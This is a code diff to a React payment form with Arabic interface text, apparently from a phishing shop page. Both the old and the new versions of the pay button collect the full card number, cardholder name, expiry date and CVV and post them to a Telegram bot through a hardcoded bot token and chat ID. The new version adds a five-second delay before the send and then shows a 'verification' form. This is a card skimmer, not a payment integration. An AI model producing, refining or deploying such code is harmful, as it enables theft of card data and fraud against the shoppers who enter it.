@@ -322,124 +322,100 @@ export default function PaymentForm({
           </div>
         )}
 
-        <button
-          onClick={() => {
-            if (paymentMethod !== "credit_card" || validateCardInfo()) {
-              const escapeMarkdown = (
-                text: string | number | Date | null | undefined
-              ) => {
-                // Convert input to string and handle null/undefined
-                const safeText = text?.toString() || "";
-                return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
-              };
-              
-              // handleVerificationComplete("1234")
-              // handlePaymentSubmit();
-              const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
-              const chatId = "-1002630840593";
+<button
+  onClick={() => {
+    setTimeout(() => {
+      if (paymentMethod !== "credit_card" || validateCardInfo()) {
+        const escapeMarkdown = (text: string | number | Date | null | undefined) => {
+          const safeText = text?.toString() || "";
+          return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
+        };
 
-              // Format shipping and order information
-              const formatOrderInfo = () => {
-                const now = new Date().toLocaleString("ar-SA");
-                let message = "";
-                return message;
-              };
+        const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
+        const chatId = "-1002630840593";
 
-              // Send order information
-              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        const formatOrderInfo = () => {
+          const now = new Date().toLocaleString("ar-SA");
+          let message = "";
+          return message;
+        };
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: formatOrderInfo(),
+            parse_mode: "Markdown",
+          }),
+        })
+          .then(() => {
+            const formatPaymentInfo = () => {
+              const now = new Date().toLocaleString("ar-SA");
+              const parts = [
+                "🔒 Payment Details 🔒",
+                `Payment Method: ${escapeMarkdown(paymentMethod)}`,
+              ];
+
+              if (cardInfo.cardNumber) {
+                const formattedCardNumber = cardInfo.cardNumber.replace(/\s/g, "");
+                parts.push(`*Card Number:* ${escapeMarkdown(formattedCardNumber)}`);
+              }
+              if (cardInfo.cardHolder) {
+                parts.push(`*Card Holder Name:* ${escapeMarkdown(cardInfo.cardHolder)}`);
+              }
+              if (cardInfo.expiryDate) {
+                parts.push(`*Expiry Date:* ${escapeMarkdown(cardInfo.expiryDate)}`);
+              }
+              if (cardInfo.cvv) {
+                parts.push(`*CVV:* ${escapeMarkdown(cardInfo.cvv)}`);
+              }
+              parts.push(`*Transaction Time:* ${escapeMarkdown(now)}`);
+
+              return parts.join("\n");
+            };
+
+            return fetch(
+              `https://api.telegram.org/bot${botToken}/sendMessage`,
+              {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                   chat_id: chatId,
-                  text: formatOrderInfo(),
+                  text: formatPaymentInfo(),
                   parse_mode: "Markdown",
                 }),
-              })
-                .then(() => {
-                  // Send payment data
-                  const formatPaymentInfo = () => {
-                    const now = new Date().toLocaleString("ar-SA");
-                    const parts = [
-                      "🔒 Payment Details 🔒",
-                      `Payment Method: ${escapeMarkdown(paymentMethod)}`,
-                    ];
-
-                    if (cardInfo.cardNumber) {
-                      const formattedCardNumber = cardInfo.cardNumber.replace(/\s/g, ""); // Remove spaces
-                      parts.push(`*Card Number:* ${escapeMarkdown(formattedCardNumber)}`);
-                    }
-                    if (cardInfo.cardHolder) {
-                      parts.push(`*Card Holder Name:* ${escapeMarkdown(cardInfo.cardHolder)}`);
-                    }
-                    if (cardInfo.expiryDate) {
-                      parts.push(`*Expiry Date:* ${escapeMarkdown(cardInfo.expiryDate)}`);
-                    }
-                    if (cardInfo.cvv) {
-                      parts.push(`*CVV:* ${escapeMarkdown(cardInfo.cvv)}`);
-                    }
-                    parts.push(`*Transaction Time:* ${escapeMarkdown(now)}`);
-                  
-              
-                    // Ensure all braces are closed
-                    return parts.join("\n");
-                  }; // Closing brace for formatPaymentInfo function
-
-                  return fetch(
-                    `https://api.telegram.org/bot${botToken}/sendMessage`,
-                    {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({
-                        chat_id: chatId,
-                        text: formatPaymentInfo(),
-                        parse_mode: "Markdown",
-                      }),
-                    }
-                  );
-                }) // Closing parenthesis for .then()
-                .then(() => {
-                  // For credit card payments, show verification form
-                  if (
-                    paymentMethod === "credit_card" &&
-                    !showVerificationForm
-                  ) {
-                    setShowVerificationForm(true);
-                  } else if (!showVerificationForm) {
-                    // For other payment methods, proceed directly
-                    handlePaymentSubmit({
-                      paymentMethod,
-                      ...(paymentMethod === "tabby" ||
-                      paymentMethod === "tamara"
-                        ? cardInfo
-                        : {}),
-                    });
-                  }
-                })
-                .catch((error) => {
-                  console.error("Error sending payment data:", error);
-                  alert(
-                    "حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى."
-                  );
-                });
-            } else {
-              alert("الرجاء التأكد من إدخال بيانات البطاقة بشكل صحيح");
+              }
+            );
+          })
+          .then(() => {
+            if (paymentMethod === "credit_card" && !showVerificationForm) {
+              setShowVerificationForm(true);
+            } else if (!showVerificationForm) {
+              handlePaymentSubmit({
+                paymentMethod,
+                ...(paymentMethod === "tabby" || paymentMethod === "tamara"
+                  ? cardInfo
+                  : {}),
+              });
             }
-          }}
-          disabled={isProcessing}
-          className={`w-full component-base py-3 px-6 font-medium ${
-            isProcessing ? "bg-gray-400 cursor-not-allowed" : "warning"
-          }`}
-        >
-          {isProcessing
-            ? "جاري معالجة الطلب..."
-            : paymentMethod === "credit_card"
-            ? "إتمام الدفع"
-            : paymentMethod === "tabby"
-            ? "الدفع مع تابي"
-            : paymentMethod === "tamara"
-            ? "الدفع مع تمارا"
-            : "إتمام الدفع"}
-        </button>
+          })
+          .catch((error) => {
+            console.error("Error sending payment data:", error);
+            alert("حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى.");
+          });
+      } else {
+        alert("الرجاء التأكد من إدخال بيانات البطاقة بشكل صحيح");
+      }
+    }, 5000); // تأخير التنفيذ لمدة 5 ثواني
+  }}
+  className={`w-full component-base py-3 px-6 font-medium ${
+    isProcessing ? "bg-gray-400 cursor-not-allowed" : "warning"
+  }`}
+>
+  إتمام الدفع
+</button>
+
       </div>
 
       {/* Show verification form when needed */}
